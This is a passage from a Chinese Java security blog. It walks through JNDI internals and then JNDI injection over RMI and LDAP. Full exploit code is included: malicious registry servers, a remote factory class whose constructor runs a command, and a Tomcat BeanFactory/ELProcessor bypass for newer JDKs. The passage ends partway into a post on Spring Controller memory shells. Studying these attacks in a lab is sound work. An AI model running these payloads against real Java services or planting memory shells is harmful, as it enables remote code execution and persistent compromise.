等\nReferences：在一个实际的对象存储键值对中，有些对象他并不能直接存储在系统中，这个时候就需要References（引用）来代表这个对象，而一个引用中必须要包含该实际对象的信息，运作状态等等。最形象的是 linux 文件系统中的 fd（ file descriptor ），我们实际对文件的操作是内容通过这个 fd 找到磁盘中对应位置和读写偏移的。\n\n0x02 Directory 目录服务目录服务相当于命名服务的一个扩展，一个键值对的信息服务中，实际对象还能够拥有对应的属性（attributes）信息，那我们进行 lookup 查找操作的时候，就不止通过名称去查找，还可以通过属性值去查找\n0x03 JNDI SPIJNDI 架构如下：层次由上往下，我们最终接触到的 JDNI 部分是 SPI，SPI 主要是为底层的具体目录服务提供统一的接口，从而实现目录服务的可插拔式的安装从这种图就能看出，JDK 原生的 JNDI 有如下服务：\n\nRMI: Java Remote Method Invocation，Java 远程方法调用\nLDAP: 轻量级目录访问协议\nCORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)\nDNS（域名转换协议）\n\nJNDI 代码实现JNDI 主要分为如下几个包：\n\njavax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类\njavax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类\njavax.naming.event：在命名目录服务器中请求事件通知\njavax.naming.ldap：提供LDAP服务支持\njavax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务\n\n开始代码的具体实现 \n0x01 JNDI_RMI 实现先写 RMI 的服务端远程对象接口：\njava\npackage com.stoocea;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n\npublic interface RemoteInterface extends Remote &#123;\n    public String sayHello() throws RemoteException;\n    public String sayHello(Object name) throws RemoteException;\n\n&#125;远程对象：\njava\npackage com.stoocea;\n\nimport java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class RemoteObject extends UnicastRemoteObject implements RemoteInterface  &#123;\n    protected  RemoteObject() throws RemoteException&#123;\n    &#125;\n    @Override\n    public String sayHello() throws RemoteException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public String sayHello(Object name) throws RemoteException &#123;\n        return null;\n    &#125;\n&#125;\n服务端逻辑：\njavapackage com.stoocea;\n\nimport java.rmi.Naming;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class RMI_Server &#123;\n    public static void main(String[] args)throws Exception &#123;\n        RemoteObject remoteObject=new RemoteObject();\n        LocateRegistry.createRegistry(1099);\n        Naming.bind(&quot;rmi://localhost:1099/Hello&quot;,remoteObject);\n        System.out.println(&quot;server端正在运行&quot;);\n    &#125;\n\n&#125; 启动 RMI 服务，然后我们用 JNDI 的接口去调远程对象\njava\npackage com.stoocea;\n\nimport javax.naming.Context;\nimport java.util.Hashtable;\nimport javax.naming.InitialContext;\n\npublic class JNDI &#123;\n    public static void main(String[] args) throws Exception&#123;\n        Hashtable&lt;String,String&gt; env=new Hashtable&lt;String,String&gt;();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);\n        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);\n\n        Context initialContext = new InitialContext(env);\n        RemoteInterface remoteObject=(RemoteInterface) initialContext.lookup(&quot;Hello&quot;);\n        System.out.println(remoteObject.sayHello(&quot;stoocea&quot;));\n\n    &#125;\n&#125;\n调用结果如下稍微分析一下 JNDI 实现端的逻辑：我们通过 设置环境变量，指定了要从哪获取对象，也就是 1099 端口上的 registry 注册中心，然后就调用创建出来的 Context 的 lookup 即可那么 JNDI 是如何识别我们指定的服务，以及如何定位到服务中心的？\nJNDI 工作流程0x01 context 初始化和对应属性设置我们之前提到过 JNDI 的整体架构，最近的一层是 JNDI 的 spi 层，他是我们能够接触到的 JNDI 最直接的，然后我们看 InitalContext 的导包结构，他导入了 naming 下的 spi 服务，而 SPI 本身的作用主要是为底层的具体目录服务提供统一的接口，从而能够使得目录服务的可插拔安装，这正好对应 InitialContext 为什么要获取 INITIAL_CONTEXT_FACTORY与PROVIDER_URL，正是为了满足这一条件\njavaHashtable&lt;String,String&gt; env=new Hashtable&lt;String,String&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);\nenv.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);\n\nContext initialContext = new InitialContext(env);\nINITIAL_CONTEXT_FACTORY能够让 initalContext 能够正常获取到我们想要指定的服务名称\nPROVIDER_URL能够让初始化出来的 context 定位到服务位置\n\n这其实跟之前 RMI 获取到服务中心的流程很像，而 RMI 其实是隶属于 JNDI 的，所以操作步骤也是差不多的除了这么一个通过 hashtable 传值初始化 initcontext 的方法，还有其他两种方法第一个是选择不初始化 initcontext直接调用 init 方法，从环境变量中获取属性值实现如下：\njava//设置JNDI环境变量\n\nSystem.setProperty(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);\n\nSystem.setProperty(Context.PROVIDER_URL,&quot;rmi://localhost:1099&quot;);\n\n//初始化上下文\n\nInitialContext initialContext = new InitialContext();JNDI 的功能点其实和 RMI 差不多\n0x02 JNDI 底层实现1x01 获取 contect 的 factor 构造类我们把断点打在initcontext初始化的地方然后继续跟进在 init 方法中，首先是获取环境变量，也就是当前系统，以及我们刚才设置的 hashtable 的环境变量然后跟进 getDefaultInitCtx()方法，最终跟进到 NamingManager 的 getInitialContext方法首先getInitialContextFactoryBuilder();获取到 Context 的工厂 builder 类，如果 builder 为空，就直接获取INITIAL_CONTEXT_FACTORY属性，作为我们的 Context 工厂 builer 类，那这里就是我们刚才通过 hashtable 设置的com.sun.jndi.rmi.registry.RegistryContextFactory了然后继续往下通过 loadClass 动态加载工厂类，最后调用 RegistryContextFactory的getInitialContext方法整理一下调用类\njavaInitialContext#init()\n    getDefaultInitCtx();\n        NamingManager.getInitialContext()\n                    VersionHelper.loadClass(className).newInstance();(这个helper是NamingManager中的一个属性值，专门用来动态实例化类)事后继续翻阅流程的时候也在最终返回的 getInitialContext 方法中，发现实现了这个方法的类就那么几个，也就是 JNDI 服务种类的那些\n1x02 获取 context 内容继续跟进 factrory 的 getInitialContext 的方法，这里的 var1 就是我们自己传的那个 hashtable 变量var1 作为 getInitCtxURL 的参数值跟进分析逻辑，这里是类 RegistryContextFactory，所以如果 var2 为空，他默认是返回 rmi 协议头，但是没有 URL 解析，这里我们 var2 肯定不为空，所以就直接返回 var2继续跟进外层的 URLToContext开始调用 rmiURLContextFactory 的 getObjectInstance 方法这里会判断我们的 RMIURL 是否为空之后，跟进 getUsingURL很奇怪，这里会直接调用 rmiURLContext 的 lookup 方法，但是此时 RMI 等相关配置还未装配，继续跟进看看逻辑由于 rmiURLContext 本身是不带 lookup 方法，所以直接到父类GenericURLContext的 lookup 方法这里第一部逻辑就是执行 getRootURLContext()方法获取解析结果，这里的结果 var 如下，结果封装成了 ResolveResult 对象，通过 getResolvedObj 方法取出 RegistryContext之后调用RegistryContext 的 lookup 方法，这里会因为我们传值的 ResolveResult 通过getRemainingName 方法返回的结果为空，所以不会继续下面的直接调用 registryImpl_stub 的 lookup 方法，而是返回当前的RegistryContext上述逻辑比较重要，因为可能刚才流程师傅们在学习的时候会很好奇为什么会进 lookup 逻辑，但是却没有返回查询结果（我也不知道为什么在创建 RegistryContext 的时候会调 lookup）那么这里返回之后会一路返回上去所以我们当前初始化的InitialContext 就是 RegistryContext 实例化对象，再次调用其 lookup 方法就是调用刚才的 lookup 了\n总结一下调用栈：下面代码部分的获取 context 不涉及getInitCtxURL 获取服务路径的部分\njavaRegistryContextFactory#getInitialContext()-&gt;\nRegistryContextFactory#URLToContext()-&gt;\nrmiURLContextFactory#getObjectInstance()-&gt;\nrmiURLContextFactory#getUsingURL()-&gt;\nrmiURLContext#lookup()-&gt;\nGenericURLContext#lookup()-&gt;\nGenericURLContext#getRootURLContext()  //到这就算是获取到了包含RegistryContext的ResolveResult对象，后续就是进lookup意思一下返回RegistryContext了其实能调 RMI 的远程 lookup，就存在攻击可能\nJNDI 动态协议转化这次我们不往InitialContext 初始化里面丢自己写好的环境变量 hashtable\njava        String string=&quot;rmi://localhost:1099/Hello&quot;;\n        Context initialContext = new InitialContext();\n        RemoteInterface remoteObject=(RemoteInterface) initialContext.lookup(string);\n        System.out.println(remoteObject.sayHello(&quot;stoocea&quot;));直接就往initialContext 的 lookup 里面写我们的 RMI 定位 URL发现依然能够查找到远程对象\n0x01 动态协议转化流程分析在 lookup 处下个断点，跟进发现在 initialContext 中不论是调哪种方法都是默认要走一层getURLOrDefaultInitCtx，也就是我们最开始获取 Context 的 factory 构造类的流程相似跟进到具体内容由于这里我们没有InitialContextFactoryBuilder，所以不能够直接去调用getDefaultInitCtx(不然就和上面的流程一样了)，往下先获取到 scheme，也就是 rmi 协议头带着 scheme 进入NamingManager.getURLContext 方法继续跟进到 getURLObject 方法这边根据_defaultPkgPrefix_属性动态生成Factory类也就是说这个包下的类都是可以通过 JNDI 的动态协议转化生成 factory 的\n直到这里，我相信师傅们应该能理解为什么要分别分析 JNDI 的正常通过获取环境变量设置去实例化获取 context，和 JNDI 动态协议转化了JNDI 动态协议转化使我们的攻击扩大了可能性以及攻击范围，虽说 JNDI 的这种动态转化的功能很方便，但是有方便，并且参数可控，就是我们可以攻击点，假如我们可以控制字符串的输入，就能够搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行(工厂类的 loadclass 动态加载)\nJNDI-Refernce 类定义在最开始的提到过，但是这里还要对其有一定的补充： **Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用  **，什么意思呢？就是当我们查询远程对象在服务中找不到时，能够从其他远程端获取到 class 文件加载并实例化Reference 类结构如下：这里只列出一种构造方法，还有其他三种构造方法，依次递减构造参数\n由于 RMI 的限制，如果想要远程对象被访问到就必须继承 UnicastRemoteObject。 所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。  \nJNDI 注入先来张流程图\n0x01 JNDI+RMI和 RMI 中远程从 codebase 中获取恶意类加载的思路是差不多的，我们这里只不过不是把 codebase 换成了 Reference 对象写一个简单的恶意 RMI 客户端\njavapackage com.stoocea;\n\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\n\nimport javax.naming.Reference;\nimport java.rmi.Naming;\nimport java.rmi.registry.LocateRegistry;\nimport java.sql.SQLOutput;\n\npublic class RMI_Server2 &#123;\n    public static void main(String[] args) throws Exception&#123;\n        LocateRegistry.createRegistry(1099);\n        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8888/&quot;);\n        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);\n        Naming.bind(&quot;rmi://127.0.0.1:1099/hello&quot;,referenceWrapper);\n        System.out.println(&quot;Registry正在运行中&quot;);\n    &#125;\n&#125;这里 Reference 必须用ReferenceWrapper包装一下，不然无法通过 RMI 访问到然后写一下恶意工厂类，必须继承ObjectFactory 类。同样也是由于必须继承远程对象类才能被 RMI 访问到，所以这里必须继承UnicastRemoteObject\njavapackage com.stoocea;\nimport javax.naming.Context;\nimport javax.naming.Name;\nimport javax.naming.spi.ObjectFactory;\nimport java.io.IOException;\nimport java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\nimport java.util.Hashtable;\n\n//远程工厂类\n\npublic class RMIHello extends UnicastRemoteObject implements ObjectFactory &#123;\n\n    public RMIHello() throws RemoteException &#123;\n\n        super();\n\n        try &#123;\n\n            Runtime.getRuntime().exec(&quot;calc&quot;);\n\n        &#125; catch (IOException e) &#123;\n\n            e.printStackTrace();\n\n        &#125;\n    &#125;\n    public String sayHello(String name) throws RemoteException &#123;\n\n        System.out.println(&quot;Hello World!&quot;);\n\n        return name;\n\n    &#125;\n    @Override\n\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;\n\n        return null;\n\n    &#125;\n&#125;之后写上受害者的信息\njavaimport javax.naming.InitialContext;\n\n\npublic class JNDI_Dynamic &#123;\n\npublic static void main(String[]args) throws Exception&#123;\n\n            String string = &quot;rmi://localhost:1099/hello&quot;;\n\n            InitialContext initialContext = new InitialContext();\n\n            initialContext.lookup(string);\n        &#125;\n&#125;成功弹出计算机\n1x01 流程分析其实上面对于 JNDI 的工作流程分析时就已经提到过了，我们这里先确定一下大概的方向：JNDI 的动态协议转化导致我们能够从 Reference 类中读取地址，从恶意地址中获取恶意工厂类（其实不用工厂类也行）字节码内容，然后本地实例化之后触发构造方法 RCE首先 lookup 处下个断点\n来到 lookup 的具体内容 继续跟进 getURLOrDefaultInitCtx 方法由于我们 URL 传值中制定了 RMI 协议，所以这里的 scheme 取出来是”RMI”，进入 if 判断完毕之后的内容，通过 NamingManager 的 getURLContext 的方法来获取 contextgetURLContext** **内容里面只有一个 getURLObject 方法继续跟进，这里根据 scheme 的值构造出了 rmiURLContext 的构造实体 factory那么之后就是根据工厂类来获取 rmiURLContext 的内容了这里就直接返回 rmiURLContext，到调用 lookup 中去还是由于 rmiURLContext 本身没有 lookup 方法的定义，跟进到 GenericURLContext 的 lookup 方法这里的getRootURLContext 方法和getResolvedObj 方法都都是为了获取 RegistryContext此时的 var3 就是RegistryContext，继续调用其 lookup 方法到这里就已经获取到了 RMI 中熟悉的 Stub，从远程客户端上请求字节码了，最后调用 decodeObeject 进行实例化这里持续跟进到 getObjectFactoryFromReference调用 loadClass 进行动态类加载与之前 JNDI 实例化 initialContext 时不同，iinitialContext 的 factory 类不是在这里实例化（虽然长得挺像的），而是在NamingManager 的 getInitialContext，至于这里的逻辑就是区别在getURLOrDefaultInitCtx 里面了，看是走 URLCtx 还是 DefaultCtx\n0x02 踩坑实录愚蠢的 stoocea 又在这里踩坑了，目录结构尽量是直接在 java 目录下，不要在子包下写服务不然客户端启动的时候找不到 RMIHello 这个恶意类（我也不知道为什么，可能寻找的地址 String 要加点什么吧）\n0x03 JNDI+LDAP0x01 什么是 LDAP首先回顾一下 LDAP 的定义（ Lightweight Directory Access Protocol ，轻型目录访问协议  ），是一种目录服务协议，运行在 TCP&#x2F;IP 堆栈上。它本身是由目录数据库和一套的目录访问协议构成的，目录服务本身是一个特殊的数据库，用来保存描述性的，基于属性的详细信息，拥有最基本的查询，浏览，以树状结构组织数据简单点说，LDAP 就是一个用来存储协议的数据库在 LDAP 中我们通过目录树来访问一条记录，基本名词和结构如下：\njavadn ：一条记录的详细位置\n\ndc ：一条记录所属区域    (哪一颗树)\n\nou ：一条记录所属组织    （哪一个分支）\n\ncn/uid：一条记录的名字/ID   (哪一个苹果名字)\n\n...\n\nLDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;。访问的深度依次从上往下JNDI 的工作流程是不会变的，如果我们可以控制 JNDI 去访问 LDAP 服务器上的恶意对象，就能够达到和 恶意 RMI 对象同样的效果\n0x02 JNDI+LDAP 攻击实现先用 windows 上常用的 LDAP 服务器把 LDAP 服务搭上，这里我用是 apache LDAP\t,首先 new 一个新的 LDAP 服务，然后在这个 LDAP 服务的基础上加上 LDAP 连接，目录结构如下之后开始 JNDI 作用 LDAP 的代码实现先写一个服务端（针对 LDAP 了，所以不用去加 ReferenceWrapper 去包装满足 RMI 的要求了）\njavaimport com.sun.jndi.rmi.registry.ReferenceWrapper;\n\nimport javax.naming.InitialContext;\nimport javax.naming.Reference;\nimport java.rmi.Naming;\n\npublic class JNDI_LDAP_Server &#123;\n    public static void main(String[] args) throws Exception&#123;\n        InitialContext initialContext=new InitialContext();\n        Reference refObj=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://localhost:8000/&quot;);\n        initialContext.rebind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,refObj);\n        System.out.println(&quot;LDAP服务器正在运行中&quot;);\n    &#125;\n&#125;\n然后要注意恶意类的编写有所改变，不是针对 RMI 形式的攻击了，这里的是 LDAP，所以不用去继承 UnicastRef\njavaimport javax.naming.Context;\n\nimport javax.naming.Name;\n\nimport javax.naming.spi.ObjectFactory;\n\nimport java.io.IOException;\n\nimport java.rmi.RemoteException;\n\nimport java.rmi.server.UnicastRemoteObject;\n\nimport java.util.Hashtable;\n\n\n\n//远程工厂类\n//如果是测试RMI-JNDI的攻击，请加上UnicastServerRefObject的继承\npublic class RMIHello  implements ObjectFactory &#123;\n\n    public RMIHello() throws RemoteException &#123;\n\n\n        try &#123;\n\n            Runtime.getRuntime().exec(&quot;calc&quot;);\n\n        &#125; catch (IOException e) &#123;\n\n            e.printStackTrace();\n\n        &#125;\n\n    &#125;\n\n    @Override\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;\n        return null;\n    &#125;\n&#125;然后是客户端：\njavaimport javax.naming.InitialContext;\n\npublic class JNDI_LDAP_Dynamic &#123;\n    public static void main(String[] args) throws Exception &#123;\n        String string = &quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;;\n\n        InitialContext initialContext = new InitialContext();\n        initialContext.lookup(string);\n    &#125;\n&#125;\n实验没问题\n1x01 攻击流程分析其实整体和 RMI 很相似，只不过初步获取 Context 不同这里我们依然断点打在 lookup 处直接进 initialContext 的 lookup，先获取 context之后返回出去开始调用 ldapURLContext 的 lookup 方法，跟进之后发现还是跟 RMIURLcontext 差不多，调用父类 GenericContext 的 lookup 方法\n前面获取解析结果 ldapCtx 就不跟进了直接进它的 lookup但是 ldapCtx 本身是没有 lookup 方法，还是得调它的父类（这里直接掉到了顶级父类）PartialCompositeContext 的 lookup 方法获取一堆信息，然后直接进 try，跟进 p_lookup最后又一直向下调用 ComponentContext 的 c_lookup跟进到最后熟悉的 DirectoryManager 的 getObjectInstance 了getObjectInstance 中跟进到 getObjectFactoryFromReference之后就是动态类加载了\nJNDI 注入高版本绕过0x01 JNDI-RMI 限制JDK 6u132, JDK 7u122, JDK 8u113之后Java限制了通过RMI远程加载Reference工厂类。估计师傅们自己在测试的时候应该也遇到了这个问题，也就是报错com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。\n1x01 源码分析相信经过上面的攻击流程分析，师傅们应该可以确定，JNDI-RMI 的远程攻击进入开始阶段是在RegistryContext#decodeObject()中对比 8u65 和 8u202 的源码不同\n\n多了一层对于类型的限制以及远程 trustURLCodebase 的检查，基本上远程 codebase 都不会被允许加载了，所以我们得另辟蹊径，首先加载本地的 factory，然后再利用这个本地的 factory 去加载远程类\n0x02 JNDI-LDAP 限制同样包下的 com.sun.jndi.rmi.object.trustURLCodebase也被默认值设置为了 false，限制相同，绕过方式也相同\n0x03 绕过实现分析我们以 RMI 的绕过为前期绕过分析对象，实际上两者共用一套绕过逻辑首先这个本地工厂类必须实现 ObjectFactory，这是一直从 JNDI 注入开始利用类就满足的一个条件，在写利用类的时候应该也发现如果实现ObjectFactory 就必须要实现 getObjectInstance 方法。然后这个工厂类实例化我们的恶意类的方法参数必须可控综合上面的条件，在 Tomcat8 的依赖包中有一个 BeanFactory满足前置的两个条件观察他的 getObjectInstance 方法，发现有一个限制：我们实例化生产的类必须是 ResouceRef 类型，不然无法进入方法的 trycatch 块处理逻辑什么是 ResourceRef 呢？在 javaweb 或者 springmvc 项目中，我们在 web.xml 中见的很多，用来引入外部资源的,而 EL 表达式其实就是 ELEMENT 元素表达式，在 web.xml 中用来加载外部资源我们看看 ResourceRef 的具体定义和内容简单来说它也是一种引用 wrapper，也就是用来包装指定类的各类信息，还包括了用来加载该类的 factory 工厂地址（为什么是 factory 呢？具体思考 javaweb 和 SSM 这一套管理类的逻辑），而且都是我们可控的，这就很巧，我们就是需要一个从本地加载 factory 类—&gt;beanfactory总结一下就是：我们用 ResourceRef 包装一下 ELProcessor 和指定加载它的beanfactory，之后让 beanfactory 去实例化 ELProcessor，调用 EL 的 eval 方法，触发 RCE\n1x03 代码实现可以先写一个恶意服务端\njavaimport com.sun.jndi.rmi.registry.ReferenceWrapper;\n\nimport org.apache.naming.ResourceRef;\n\n\nimport javax.naming.InitialContext;\nimport javax.naming.StringRefAddr;\n\nimport java.rmi.Naming;\nimport java.rmi.registry.LocateRegistry;\n\nimport java.rmi.registry.Registry;\n\n\n\npublic class JNDIbyPass &#123;\n\n    public static void main(String[] args) throws Exception &#123;\n        LocateRegistry.createRegistry(1099);\n        InitialContext initialContext=new InitialContext();\n        //Reference refObj=new Reference(&quot;evilref&quot;,&quot;evilref&quot;,&quot;http://localhost:8000/&quot;);\n        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);\n        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));\n        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance()&quot; +\n                &quot;.getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]&quot; +\n                &quot;([&#39;calc&#39;]).start()\\&quot;)&quot;));\n        //initialContext.rebind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,ref);\n        initialContext.rebind(&quot;rmi://localhost:1099/remoteobj&quot;,ref);\n    &#125;\n\n&#125;\n然后写一个受害者\njavaimport javax.naming.InitialContext;\n\n\n\npublic class JNDI_Dynamic &#123;\n\n    public static void main(String[]args) throws Exception&#123;\n\n        String string = &quot;rmi://localhost:1099/remoteobj&quot;;\n\n        InitialContext initialContext = new InitialContext();\n\n        initialContext.lookup(string);\n\n    &#125;\n\n&#125;执行起来应该没有问题，复现时要注意 java 中的 eval 能不能直接加载 runtime 类进行命令执行，以及 EL 的依赖是否打上了\n1x04 流程分析断点依然是打在 lookup 中，但是这里我们就直接进 lookup 了，getURLOrDefaultInitCtx 返回出来依然是 rmiURLContext逻辑照旧由于是 RMI 的 context ，所以直接就跟进到 RegistryContext 的 lookup通过 RMI 原生获取到字节码之后，再调用 decodeObject 方法关键性逻辑在第一句，这里会判断我们传进来的要实例化的对象是否是 RemoteRef 类，如果是的话，那我们这个流程就肯定没有后续了，因为它会将实例化对象强转为 RemoteReference 类型，会自带 classFactoryLocation 属性字段，后面的 if 判断就过不去了，这就是为什么我们要选择 ResourceRef 的原因继续往下来到最为关键的 if 判断，由于我们的指定实例化类是 ResourceRef，不带 classFactoryLocation 属性，所以三个判断条件中，第二个判断条件不符合要求，与运算不通过，可以开开心心进行类加载了那么直接跟进 NamingManager 的 getObjectInstance 方法首先对其强转为 Reference 类，然后直接通过getFactoryClassName 获取到工厂类的全类名（此时是org.apache.naming.factory.BeanFactory），调用getObjectFactoryFromReference先对它进行类加载然后开始调用工厂类的getObjectInstance对类实现实例化加载这里稍微看一下变量表自然跟进到BeanFactory的getObjectInstance方法调用ResourceRef.getClassName()，获取到 ELProcessor 的全类名，开一个当前线程的 context 类加载器，对 ELProcessor 进行类加载然后的内容就是对 ResourceRef 这个类中的设定的信息进行处理，比如说获取到 forceString，然后对其字符串处理满足表达式，然后获取要执行方法的参数等等，最后的最后，获取到方法以及参数之后反射调用，触发 RCE最终触发如下EL 表达式其实是一种很常用的 RCE 媒介，初次完整分析很过瘾\nJNDI 复习 over，除了思路开拓和基础部分是跟文章，分析部分都是自己去走逻辑，去解决自己遇到的问题，感觉很爽，不会再去傻傻的跟着别人的步骤走了\n总结稍微总结一下JNDI 的工作流程，不论是不是动态协议转化，都是一个总的逻辑：为了获取到 context 实例而去构造 factory 工厂类，然后通过 factory 去实例化 context，然后再去通过 context 去调用各种方法如果是指定 initialcontext 的属性，调用 initialcontext 的各种功能方法，那么逻辑大致为如果是动态协议转化（漏洞所在）initialContext 直接调方法，比如 lookup，那么他会先判断是哪种协议，然后通过获取该协议相关的 factory，去构造该协议的 Context，再去调该协议 Context 的方法，我们的漏洞分析也就是从这里开始的\n\ngetURLOrDefaultInitCtx 获取到相关协议 Context\n相关协议 context 调用相关方法，如 lookup\n通过 RMI 原生获取到远程服务器上的恶意字节码\ndecodeObject 开始实例化，本质还是通过工厂类去实例化\n调用工厂类的getObjectInstance 去完成（高版本与低版本的区别就在此是否有对类型的限制，以及trustURLCodebase 默认是否为 false）\n\n","slug":"JNDIRe0","date":"2024-03-11T03:10:00.000Z","categories_index":"锻刀的理论学习-JNDIRe0反序列化","tags_index":"锻刀","author_index":"stoocea"},{"id":"64e032b32426815991c1b7bf0ba5ba62","title":"Spring型内存马","content":"1 Spring 特性0x01 综述简化来说就是 IOC 和 AOP，中文翻译是控制反转和切面编程。我个人理解：IOC 是把 java 类托管，我们就不需要自己主动去 new 一个类了，按需向 IOC 容器中取就行；AOP 其实我个人感觉很像 JavaAgent，只不过 Spring 实现起来比较简单，写一个配置类和对应的配置文件即可精确定位方法，实现方法执行前，中，后插入代码执行\n0x02 Spring 以及 SprinMVC我们由 Spring 特性提取出一段信息：Spring 中的对象都是托管给 IOC 容器去管理的，不论是获取，删除等操作，都是由 IOC 容器去做的至于 Spring 或者 springboot 的一个小 demo，师傅们可以移步至其他基础部分，这里就不多阐述然后必须提的一点是 SpringMVC 的流程，我这里有一张图，然后辅助一些文字描述：\n\n首先 DispatchServlet 接收到客户端发送过来的请求信息（tomcat 已经处理完信息了，由单独的 servlet 接收），然后 DispatchServlet去调用 HandlerMapping，其主要目的是去完成对应 Controller 的搜索\n找到 Controller 后自然是去执行 Controller 的逻辑，Controller 的逻辑依赖于调用业务逻辑执行，也就是对 Mapper 层的 CRUD 操作，然后 Controller 会将这些处理完之后的数据打包，发送给 ModelAndView 去渲染\nModelAndView渲染完毕，发送给 DispatchServlet，让他去处理对应的前端渲染相关工作\n最后DispatchServlet终于返回到了前端，也就是用户看到的数据\n\n所以 SpringMVC 的核心点就是 DispatchServlet，它起到了一个中轴的作用，之后的分析会着重于它\n0x03 IOC 容器Spring 中 IOC 的中文翻译：控制反转，我个人理解为，程序员不用再去过多的处理类的创建和配置，专心于控制逻辑的设计，到需要用到 java 对象时再从容器中取出就行Spring 框架中 BeanFactory接口就是 spring IOC 容器的实际代表者，但是 一个 IOC 不可能只单单有这些功能，还需要获取 sources 资源，以及字符转化等功能，所以最终 ApplicationContext 就来继承一些必要的接口（BeanFactory 肯定包含在内），作为 IOC 容器\n每一个 dispatchservlet 都代表着一段完整的逻辑链，我们在学习的时候一般都是一个 web 程序有一个 dispatchservlet，而一个 dispatchservlet 的创建就代表着一个 child context型的 IOC 容器被创建了，有 child 必有 Root（not father），Spring 中的 Root Context是伴随着 ContextLoaderListener 创建的，这也是全局唯一一个公共的 IOC 容器前面也提到了，IOC 容器的代表者是 ApplicationContext，当然这个 child 的 IOC 容器。Root 的 IOC 容器叫做 WebApplicationContext，所有的 child 可以取访问 Root 容器，但是 Root 却不能去访问 Child 中的内容随着每一个 Context 被创建，都会被最为属性存入 Tomcat 中的 ServletContext\n讲了这么多，其实是为了解决动态注册 Controller 等 Spring 中常用且可用组件注册的问题，也就引出了我们如何注入 Spring 型内存马的整体思路：\n\n获取到上下文环境内容\n注册恶意组件\n配置路径映射\n\n2 Controller 型内存马0x01 为什么是 Controller？刚开始学内存马的 filter，listener，servlet 等类型的最直观的体现：我们通过某个特定的路由去访问内存马，都是作用于路由，我们客户端能够访问到，而 Spring 中最直观的路由逻辑的体现就是 Controller 了\n0x02 实现分析1x01 获取到上下文内容总计四种方法1 ContextLoaderListener这种方法是获取的当前 ContextLoaderListener创建的 Root WebApplicationContext\njavaWebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();2  WebApplicationContextUtils这个工具类的getWebApplicationContext 方法也是获取的 ContextLoaderListener 创建的 Root WebApplicationContext \njavaWebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());其实这个类的  getRequiredWebApplicationContext也能够获取到 RootContext\n\n多讲一嘴这个 getWebApplicationContext方法是如何获取到 Root Context 的：它其实是从 Servlet 中直接通过键值对取出的 RootContext在这个 Utils 获取 WAC 的整体的逻辑中，最终都是调用到了 getWebApplicationContext来获取\n3 RequestContextUtilsjavaWebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());这个类的 getWebApplicationContext方法现在改成了 findWebApplicationContext方法\n4 getAttributejavaWebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);这个是从 ServletContext 中获取\n1x02 动态注册 Controller2x01 如何获取到映射注册器回顾 MVC 的控制流程，接受到客户端发送的信息之后，调用 HandlerMapping去找对应的 Controller 处理逻辑。这里的 HandlerMapping其实指的是 RequestMappingHandlerMappingRequestMappingHandlerMapping是 Spring 中一个十分重要的 bean，Spring 会先把 Controller 解析成RequestMappingInfo对象，然后再注册进RequestMappingHandlerMapping中，这样请求才能够从 RequestMappingHandlerMapping中找到对应的 Controller那么现在的目标是如何获取到RequestMappingHandlerMapping并向RequestMappingHandlerMapping中注册 Controller一个一个解决问题：\n\n获取 RequestMappingHandlerMapping本身并不难，Spring 对于这么重要类当然是自己事先就注册好了的，存放于 IOC 